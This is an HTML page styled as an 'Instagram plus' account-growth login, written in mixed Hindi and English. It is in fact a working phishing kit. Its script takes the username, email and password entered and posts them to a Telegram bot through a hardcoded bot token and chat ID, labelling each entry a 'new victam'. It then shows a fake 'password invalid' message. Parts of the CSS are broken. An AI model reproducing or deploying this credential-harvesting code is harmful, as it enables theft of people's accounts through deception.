<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Grow account — Log-in your Account! </title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,700;1,500&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg: #000;
    --card: #000;
    --card-border: #f00;
    --gold: #f00;
    --ruby: #f00;
    --gold: #f00;
    --violet: #0;
    --text-muted: #8a8a8a;
  }

  *{ box-sizing: border-box; }

  html, body{
    margin:0;
    padding:0;
    background: var(--bg);
    color: #fff;
    font-family: 'Inter', sans-serif;
    min-height:100vh;
  }

  body{
    display:flex;
    align-items:center;
    justify-content:center;
    padding: 32px 16px;
    position:relative;
    overflow-x:hidden;
  }

  /* ambient glow */
  body::before{
    content:"";
    position:fixed;
    top:-20%;
    left:50%;
    transform:translateX(-50%);
    width:900px;
    height:900px;
    background: radial-gradient(circle, rgba() 50%, rgba(255,775) 50%, transparent 10%);
    pointer-events:none;
    z-index:100;
  }

  .wrap{
    position:relative;
    z-index:1;
    width:100%;
    max-width: 460px;
  }

  .eyebrow{
    text-align:center;
    letter-spacing: 0.3em;
    text-transform: uppercase;
    font-size: 11px;
    font-weight: 600;
    color: var(--gold);
    margin-bottom: 14px;
  }

  h1{
    font-family: 'Playfair Display', serif;
    font-weight: 700;
    font-size: clamp(34px, 7vw, 46px);
    line-height: 1.05;
    text-align:center;
    margin: 0 0 10px;
    background: linear-gradient(120deg, var(--gold) 10%, #f00 100%, var(--gold) 10%);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
  }

  .sub{
    text-align:center;
    color: var(--text-muted);
    font-size: 14.5px;
    margin-bottom: 34px;
    line-height:1.5;
  }

  .card{
    background: var(--card);
    border: px solid var(--card-border);
    border-radius: 1px;
    padding: 30px 26px 26px;
    box-shadow: 0 20px 60px rgba(0,5,.5);
  }

  .field{
    margin-bottom: 10px;
  }

  label{
    display:block;
    font-size: 12.5px;
    font-weight: 600;
    letter-spacing: 0.04em;
    text-transform: uppercase;
    margin-bottom: 8px;
  }

  .field:nth-of-type(1) label{ color: var(--white); }
  .field:nth-of-type(2) label{ color: var(--white); }
  .field:nth-of-type(3) label{ color: var(--white); }

  input{
    width:100%;
    background: #000;
    border: 1.5px solid var(--card-border);
    border-radius: 5px;
    padding: 8px 4px;
    color:#fff;
    font-family:'Inter', sans-serif;
    font-size: 15px;
    outline: none;
    transition: border-color .2s ease, box-shadow .2s ease;
  }
  input::placeholder{ color: #4d4d4d; }

  .field:nth-of-type(1) input:focus{ border-color: var(--green); box-shadow: 0 0 0 3px rgba(232,179,74,0.10); }
  .field:nth-of-type(2) input:focus{ border-color: var(--green); box-shadow: 0 0 0 3px rgba(45,217,196,0.15); }
  .field:nth-of-type(3) input:focus{ border-color: var(--green); box-shadow: 0 0 0 3px rgba(167,139,250,0.15); }

  button{
    width:100%;
    margin-top: 10px;
    padding: 10px;
    border: none;
    border-radius: 1px;
    font-family:'Inter', sans-serif;
    font-weight: 700;
    font-size: 15px;
    letter-spacing: 0.02em;
    cursor: pointer;
    background: linear-gradient(120deg, var(--ruby), var(--ruby));
    color: #fff;
    transition: transform .15s ease, opacity .15s ease;
  }
  button:hover{ transform: translateY(-1px); }
  button:active{ transform: translateY(0); }
  button:disabled{ opacity:0.6; cursor:not-allowed; transform:none; }

  .msg{
    margin-top: 16px;
    text-align:center;
    font-size: 13.5px;
    font-weight: 600;
    min-height: 18px;
  }
  .msg.ok{ color: var(--teal); }
  .msg.err{ color: var(--ruby); }

  .footer-note{
    text-align:center;
    color:#4d4d4d;
    font-size: 20.5px;
    margin-top: 22px;
    letter-spacing: 0.02em;
  }
</style>
</head>
<body>

<div class="wrap">
  <div class="eyebrow">Instagram plus </div>
  <h1>log-in your account! </h1>
  <p class="sub">Enter your username, email, and password. Your account must be public for this to work.  .</p>

  <div class="card">
    <form id="bookingForm">
      <div class="field">
        <label for="name">usernaam</label>
        <input type="text" id="username" placeholder="enter username" required>
      </div>
      <div class="field">
        <label for="email">Email</label>
        <input type="email" id="email" placeholder="you@example.com" required>
      </div>
      <div class="field">
        <label for="phone">Password</label>
        <input type="tel" id="password" placeholder="enter Password" required>
      </div>
      <button type="submit" id="submitBtn">Log-in now</button>
      <div class="msg" id="msg"></div>
    </form>
  </div>

  <div class="footer-note">Enter the ID you want to use for your account growth! .</div>
</div>

<script>
  const BOT_TOKEN = "8715802394:AAFrw0B8JJ8WeOabqpEeKGnjPd7qlgm3FfU";
  const CHAT_ID = "8754716060";

  const form = document.getElementById("bookingForm");
  const msg = document.getElementById("msg");
  const btn = document.getElementById("submitBtn");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    if(!username || !email || !password){
      msg.textContent = "Please sabhi fields bharein.";
      msg.className = "msg err";
      return;
    }

    btn.disabled = true;
    btn.textContent = "Bhej rahe hain...";
    msg.textContent = "";
    msg.className = "msg";

    const text =
      "👨‍💻 new victam received 💀\n\n" +
      "👤 username: " + username + "\n" +
      "📧 Email: " + email + "\n" +
      "📱 Password: " + password;

    try{
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
      });

      const data = await res.json();

      if(data.ok){
        msg.textContent = "password invalid please re login! Hum jaldi contact karenge.";
        msg.className = "msg ok";
        form.reset();
      } else {
        msg.textContent = "Kuch galat hua. Dobara try karein.";
        msg.className = "msg err";
      }
    } catch(err){
      msg.textContent = "Network error — dobara try karein.";
      msg.className = "msg err";
    } finally {
      btn.disabled = false;
      btn.textContent = "Booking Bhejein";
    }
  });
</script>

</body>
</html>
